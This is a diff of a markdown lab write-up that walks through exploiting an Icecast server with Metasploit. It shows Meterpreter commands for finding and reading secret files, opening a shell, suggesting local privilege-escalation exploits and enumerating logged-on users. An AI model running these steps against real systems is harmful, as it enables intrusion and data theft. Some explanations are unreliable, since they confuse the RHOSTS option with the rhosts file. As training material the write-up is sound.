@@ -69,14 +69,14 @@ Now we’ll use a tool called SearchSploit to locally store a library of exploit
 
 3. Start Metasploit and search for the Icecast module and load it for use.:
  
-    >Msfconsole.
+    - Msfconsole.
     
-    >Search icecast.
+    - Search icecast.
     
-    >Use 0.
+    - Use 0.
 
-MSFconsole provides a command line interface to access and work with the Metasploit.
-The Metasploit is a computer security that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. 
+- The Metasploit is a computer security that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. 
+- MSFconsole provides a command line interface to access and work with the Metasploit.
 
     starting metasploit and searching icecast
  ![RHOST setting](./Images/snap-x.PNG)
@@ -87,11 +87,11 @@ The Metasploit is a computer security that provides information about security v
 
 4. Set the `RHOST` to the target machine and run.
 
-    set RHOSTS 192.168.0.20.
-    run.
+    - set RHOSTS 192.168.0.20.
+    - run.
 
- Rhosts allows me to log in to a UNIX-based system from another computer on the same network.
- The rhosts file contains a list of hosts and user names that determines who can log in to a system remotely without a password
+**Rhosts allows me to log in to a UNIX-based system from another computer on the same network.**
+**The rhosts file contains a list of hosts and user names that determines who can log in to a system remotely without a password.**
 
     Setting RHOST to IP adress
 ![RHOST setting](./Images/snap-4.PNG)
@@ -99,23 +99,25 @@ The Metasploit is a computer security that provides information about security v
 
 5. Search for the `secretfile.txt` on the target.
 
-    meterpreter > search -f *secret*.
+    - meterpreter > search -f *secret*.
 
 OR
-
-    meterpreter > shell.
-
-Meterpreter allows me to remotely take over the compromised system, having control of the file system, collect sensitive information such as credentials and secret files.
     
+    - meterpreter > shell.
+
+**Meterpreter allows me to remotely take over the compromised system, having control of the file system, collect sensitive information such as credentials and secret files.**
+**Shell is a software program that provides direct communication between you and the operating system or application, providing an environment to automate IT operations.**
+
     The search of the secret 
 ![The search of secret file](./Images/snap-xy.PNG)
 
 6. Search for the `recipe.txt` on the target and download the file:
-    meterpreter > search -f *recipe*
-    meterpreter > cd 'C:\Users/IEUser/Documents
-    meterpreter > ls
-    meterpreter > cat Drinks.recipe.txt
-    meterpreter > cat user.secretfile.txt
+    
+    - meterpreter > search -f *recipe*
+    - meterpreter > cd 'C:\Users/IEUser/Documents
+    - meterpreter > ls
+    - meterpreter > cat Drinks.recipe.txt
+    - meterpreter > cat user.secretfile.txt
 
     Search of the recipe
     ![search of the recipe](./Images/snap-6.PNG)
@@ -124,19 +126,19 @@ Meterpreter allows me to remotely take over the compromised system, having contr
 
 7. Use Meterpreter's local exploit suggester to find possible exploits.
     
-    meterpreter> run post/multi/recon/local_exploit_suggestor
+    - meterpreter> run post/multi/recon/local_exploit_suggestor
 
 The system was also found to be vulnerable to the following exploits:
     
-    exploit/windows/local/ikeext_service
-    exploit/windows/local/ms16_075_reflection
+    - exploit/windows/local/ikeext_service
+    - exploit/windows/local/ms16_075_reflection
 
     Using meterpreter for local exploit
    ![Using meterpreter for local exploit](./Images/snap-7.PNG)
 
 8. Run a Meterpreter post script that enumerates all logged on users.
     
-    run post/windows/gather/enum_logged_on_users
+    - run post/windows/gather/enum_logged_on_users
     
     
     Using meterpreter post script
